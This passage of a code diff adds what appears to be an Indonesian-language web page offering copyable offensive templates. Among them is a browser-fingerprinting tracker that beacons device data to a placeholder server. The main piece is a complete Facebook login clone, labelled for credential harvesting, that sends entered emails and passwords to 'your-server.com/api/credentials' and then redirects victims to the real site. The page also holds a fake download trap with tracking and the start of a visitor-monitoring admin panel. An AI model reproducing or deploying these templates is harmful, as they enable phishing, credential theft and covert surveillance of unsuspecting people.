+            document.getElementById('audioFingerprint').textContent = audioHash;
+
+            // Draw on display canvas
+            const displayCanvas = document.getElementById('displayCanvas');
+            const ctx = displayCanvas.getContext('2d');
+            
+            // Draw fingerprint representation
+            ctx.fillStyle = '#001100';
+            ctx.fillRect(0, 0, 300, 150);
+            
+            ctx.font = '12px monospace';
+            ctx.fillStyle = '#00ff00';
+            ctx.fillText(`Canvas: ${canvasHash}`, 10, 20);
+            ctx.fillText(`WebGL: ${webglData.renderer.substring(0, 30)}...`, 10, 40);
+            ctx.fillText(`Audio: ${audioHash}`, 10, 60);
+            
+            // Draw bars based on hash
+            for (let i = 0; i < 20; i++) {
+                const value = parseInt(canvasHash[i] || '0', 16) || 0;
+                const height = value * 5;
+                ctx.fillStyle = '#00ff00';
+                ctx.fillRect(10 + i * 10, 130 - height, 5, height);
+            }
+
+            // Send data to server
+            const fingerprintData = {
+                canvas: canvasHash,
+                webgl: webglData,
+                audio: audioHash,
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                platform: navigator.platform,
+                hardware: {
+                    ram: navigator.deviceMemory || 'unknown',
+                    cores: navigator.hardwareConcurrency || 'unknown'
+                }
+            };
+
+            // Send using beacon
+            navigator.sendBeacon('https://your-server.com/api/fingerprint', JSON.stringify(fingerprintData));
+        })();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== PHISHING PAGE TEMPLATES ========== -->
+        <div id="phishing" class="template-section">
+            <h2 style="margin-bottom: 20px;">▸ PHISHING PAGE TEMPLATES</h2>
+            
+            <!-- Template 6: Facebook Clone -->
+            <div class="template-card">
+                <div class="card-header">
+                    <h3>06 :: FACEBOOK LOGIN CLONE</h3>
+                    <span class="card-badge">PHISHING</span>
+                </div>
+                <div class="card-body">
+                    <p>Halaman login Facebook palsu untuk credential harvesting.</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>facebook_clone.html</span>
+                            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                        </div>
+                        <pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;Facebook - Masuk atau Daftar&lt;/title&gt;
+    &lt;style&gt;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 980px;
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .left-section {
+            width: 50%;
+            padding-right: 32px;
+        }
+        .left-section h1 {
+            color: #1877f2;
+            font-size: 60px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        .left-section p {
+            font-size: 28px;
+            font-weight: 400;
+            color: #1c1e21;
+        }
+        .right-section {
+            width: 40%;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        .login-btn:hover {
+            background: #166fe5;
+        }
+        .forgot-link {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .forgot-link a {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-btn {
+            width: 100%;
+            padding: 12px;
+            background: #42b72a;
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        .create-btn:hover {
+            background: #36a420;
+        }
+        .warning {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #777;
+            text-align: center;
+        }
+        .url-bar {
+            background: #f0f2f5;
+            padding: 8px 12px;
+            border-radius: 50px;
+            margin-bottom: 15px;
+            font-size: 12px;
+            color: #606770;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .url-bar .lock {
+            font-size: 14px;
+        }
+        .fake-url {
+            color: #1c1e21;
+            font-weight: 500;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="container"&gt;
+        &lt;div class="left-section"&gt;
+            &lt;h1&gt;facebook&lt;/h1&gt;
+            &lt;p&gt;Dengan Facebook, bagikan dan tetap terhubung dengan orang-orang di sekitarmu.&lt;/p&gt;
+        &lt;/div&gt;
+        
+        &lt;div class="right-section"&gt;
+            &lt;div class="url-bar"&gt;
+                &lt;span class="lock"&gt;🔒&lt;/span&gt;
+                &lt;span&gt;https://&lt;span class="fake-url"&gt;facebook.com&lt;/span&gt;/login.php&lt;/span&gt;
+            &lt;/div&gt;
+            
+            &lt;form id="loginForm" onsubmit="return false;"&gt;
+                &lt;div class="form-group"&gt;
+                    &lt;input type="text" id="email" placeholder="Email atau Nomor Telepon" required&gt;
+                &lt;/div&gt;
+                &lt;div class="form-group"&gt;
+                    &lt;input type="password" id="password" placeholder="Kata Sandi" required&gt;
+                &lt;/div&gt;
+                &lt;button type="submit" class="login-btn" onclick="submitLogin()"&gt;Masuk&lt;/button&gt;
+            &lt;/form&gt;
+            
+            &lt;div class="forgot-link"&gt;
+                &lt;a href="#"&gt;Lupa kata sandi?&lt;/a&gt;
+            &lt;/div&gt;
+            
+            &lt;div class="divider"&gt;&lt;/div&gt;
+            
+            &lt;button class="create-btn" onclick="window.location.href='https://facebook.com/r.php'"&gt;Buat Akun Baru&lt;/button&gt;
+            
+            &lt;div class="warning"&gt;
+                &lt;strong&gt;Halaman ini aman&lt;/strong&gt; · Halaman login palsu untuk demo
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;script&gt;
+        function submitLogin() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                alert('Harap isi semua field');
+                return;
+            }
+            
+            // Collect credentials and fingerprint
+            const data = {
+                type: 'facebook_login',
+                timestamp: new Date().toISOString(),
+                email: email,
+                password: password,
+                ip: '{{client_ip}}',
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                referrer: document.referrer
+            };
+            
+            // Send to server
+            fetch('https://your-server.com/api/credentials', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).then(() => {
+                // Redirect to real Facebook after "error"
+                setTimeout(() => {
+                    window.location.href = 'https://facebook.com/login.php?error=1';
+                }, 1000);
+            });
+            
+            // Show loading state
+            document.querySelector('.login-btn').textContent = 'Memproses...';
+            document.querySelector('.login-btn').disabled = true;
+            
+            return false;
+        }
+
+        // Track page view
+        (function() {
+            const pageData = {
+                type: 'page_view',
+                url: window.location.href,
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer
+            };
+            
+            navigator.sendBeacon('https://your-server.com/api/pageview', JSON.stringify(pageData));
+        })();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== DOWNLOAD TRAP TEMPLATES ========== -->
+        <div id="download" class="template-section">
+            <h2 style="margin-bottom: 20px;">▸ DOWNLOAD TRAP PAGES</h2>
+            
+            <!-- Template 7: Fake Download -->
+            <div class="template-card">
+                <div class="card-header">
+                    <h3>07 :: FAKE DOWNLOAD PAGE</h3>
+                    <span class="card-badge">TRAP</span>
+                </div>
+                <div class="card-body">
+                    <p>Halaman download palsu dengan tracking.</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>fake_download.html</span>
+                            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                        </div>
+                        <pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Download File&lt;/title&gt;
+    &lt;style&gt;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .download-card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .file-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .file-info {
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .file-size {
+            background: #f0f0f0;
+            padding: 10px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        .countdown {
+            font-size: 24px;
+            color: #667eea;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+        .download-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            transition: transform 0.3s;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102,126,234,0.4);
+        }
+        .download-btn.disabled {
+            background: #ccc;
+            pointer-events: none;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: #f0f0f0;
+            border-radius: 5px;
+            margin: 30px 0 10px;
+            overflow: hidden;
+        }
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: #667eea;
+            transition: width 0.3s;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="download-card"&gt;
+        &lt;div class="file-icon"&gt;📁&lt;/div&gt;
+        &lt;h2&gt;File siap diunduh&lt;/h2&gt;
+        &lt;div class="file-info"&gt;Premium-Content.zip&lt;/div&gt;
+        
+        &lt;div class="file-size"&gt;
+            Ukuran: 2.4 GB · Format: ZIP · 2452 downloads
+        &lt;/div&gt;
+
+        &lt;div id="countdown" class="countdown"&gt;5&lt;/div&gt;
+        
+        &lt;div class="progress-bar"&gt;
+            &lt;div class="progress" id="progress"&gt;&lt;/div&gt;
+        &lt;/div&gt;
+
+        &lt;button id="downloadBtn" class="download-btn disabled" onclick="startDownload()"&gt;
+            Menunggu...
+        &lt;/button&gt;
+    &lt;/div&gt;
+
+    &lt;script&gt;
+        let seconds = 5;
+        const countdownEl = document.getElementById('countdown');
+        const progressEl = document.getElementById('progress');
+        const downloadBtn = document.getElementById('downloadBtn');
+        
+        // Tracking data
+        const downloadData = {
+            timestamp: new Date().toISOString(),
+            page: 'download_page',
+            userAgent: navigator.userAgent,
+            screen: `${screen.width}x${screen.height}`,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            downloadStarted: false,
+            timeToDownload: 0
+        };
+
+        const startTime = Date.now();
+
+        // Countdown timer
+        const interval = setInterval(() => {
+            seconds--;
+            countdownEl.textContent = seconds;
+            
+            // Update progress bar
+            const progress = ((5 - seconds) / 5) * 100;
+            progressEl.style.width = progress + '%';
+            
+            if (seconds <= 0) {
+                clearInterval(interval);
+                countdownEl.textContent = '✓';
+                downloadBtn.textContent = 'DOWNLOAD SEKARANG';
+                downloadBtn.classList.remove('disabled');
+                
+                // Track when download becomes available
+                downloadData.downloadAvailable = Date.now() - startTime;
+                navigator.sendBeacon('https://your-server.com/api/download-ready', JSON.stringify(downloadData));
+            }
+        }, 1000);
+
+        function startDownload() {
+            if (seconds > 0) return;
+            
+            downloadData.downloadStarted = true;
+            downloadData.timeToDownload = Date.now() - startTime;
+            downloadData.downloadTime = new Date().toISOString();
+            
+            // Send tracking
+            navigator.sendBeacon('https://your-server.com/api/download-start', JSON.stringify(downloadData));
+            
+            // Fake download - redirect to actual file or ad
+            const fakeDownloadUrl = 'https://your-server.com/track/download-click?redirect=https://example.com/file.zip';
+            window.location.href = fakeDownloadUrl;
+            
+            // Visual feedback
+            downloadBtn.textContent = 'Memproses...';
+            downloadBtn.classList.add('disabled');
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== ADMIN PANEL TEMPLATES ========== -->
+        <div id="admin" class="template-section">
+            <h2 style="margin-bottom: 20px;">▸ ADMIN DASHBOARD</h2>
+            
+            <!-- Template 8: Real-time Monitor -->
+            <div class="template-card">
+                <div class="card-header">
+                    <h3>08 :: REAL-TIME VISITOR MONITOR</h3>
+                    <span class="card-badge">ADMIN</span>
+                </div>
+                <div class="card-body">
+                    <p>Dashboard untuk monitoring visitor secara real-time.</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>admin_monitor.html</span>
+                            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                        </div>
+                        <pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Tracker Admin - Real-time Monitor&lt;/title&gt;
+    &lt;style&gt;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0a0a;
+            font-family: 'Courier New', monospace;
+            color: #00ff00;
+            padding: 20px;
+        }
+        .header {
+            border-bottom: 2px solid #00ff00;
+            padding: 20px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .stat-card {
+            border: 1px solid #00ff00;
+            padding: 20px;
+            background: #000;
+        }
+        .stat-value {
+            font-size: 36px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .stat-label {
+            color: #008800;
+            font-size: 12px;
+            text-transform: uppercase;
+        }
+        .filters {
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .filter-btn {
+            background: transparent;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 5px 15px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+        }
+        .filter-btn.active {
+            background: #00ff00;
+            color: #000;
+        }
+        .visitor-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        .visitor-table th {
+            text-align: left;
+            padding: 10px;
+            border-bottom: 2px solid #00ff00;
+            color: #008800;
+        }
+        .visitor-table td {
+            padding: 10px;
+            border-bottom: 1px solid #003300;
+        }
+        .visitor-table tr:hover {
+            background: #001100;
+        }
+        .ip-address {
+            color: #00ff00;
+            font-weight: bold;
+        }
+        .device-info {
+            font-size: 12px;
+            color: #008800;
+        }
+        .timestamp {
+            color: #008800;
+        }
+        .status-badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-size: 11px;
+        }
+        .status-online {
+            background: #00ff00;
+            color: #000;
+        }
+        .status-offline {
+            background: #003300;
+            color: #008800;
+        }
+        .map-container {
+            height: 400px;
+            border: 1px solid #00ff00;
+            margin-top: 30px;
+            background: #000;
+        }
+        .realtime-indicator {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .pulse {
+            width: 10px;
+            height: 10px;
+            background: #00ff00;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .export-btn {
+            background: transparent;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 8px 15px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+        }
+        .export-btn:hover {
+            background: #00ff00;
+            color: #000;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="header"&gt;
+        &lt;h1&gt;TRACKER ADMIN v2.0&lt;/h1&gt;
+        &lt;div class="realtime-indicator"&gt;
+            &lt;div class="pulse"&gt;&lt;/div&gt;
+            &lt;span&gt;LIVE &lt;span id="visitorCount"&gt;0&lt;/span&gt; online&lt;/span&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;div class="stats-container"&gt;
+        &lt;div class="stat-card"&gt;
+            &lt;div class="stat-label"&gt;Total Visitors&lt;/div&gt;
+            &lt;div class="stat-value" id="totalVisitors"&gt;0&lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div class="stat-card"&gt;
+            &lt;div class="stat-label"&gt;Today&lt;/div&gt;
+            &lt;div class="stat-value" id="todayVisitors"&gt;0&lt;/div&gt;
+        </pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Template navigation
+        function showTemplate(templateId) {
+            // Hide all sections
+            document.querySelectorAll('.template-section').forEach(section => {
+                section.classList.remove('active');
+            });
+            
+            // Show selected section
+            document.getElementById(templateId).classList.add('active');
+            
+            // Update nav buttons
+            document.querySelectorAll('.nav-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+        }
+
+        // Copy code function
+        function copyCode(button) {
+            const codeBlock = button.closest('.code-block').querySelector('pre');
+            const textArea = document.createElement('textarea');
+            textArea.value = codeBlock.textContent;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+            
+            button.textContent = 'COPIED!';
+            setTimeout(() => {
+                button.textContent = 'COPY';
+            }, 2000);
+        }
+
+        // Matrix background effect
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+
+        const drops = [];
+        for(let i = 0; i < columns; i++) {
+            drops[i] = Math.floor(Math.random() * canvas.height / fontSize);
+        }
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#0f0';
+            ctx.font = fontSize + 'px monospace';
+
+            for(let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+
+        setInterval(drawMatrix, 50);
+
+        // Update visitor count (demo)
+        let count = 0;
+        setInterval(() => {
+            count += Math.floor(Math.random() * 3);
+            document.getElementById('visitorCount').textContent = count;
+        }, 5000);
+    </script>
+</body>
+</html>
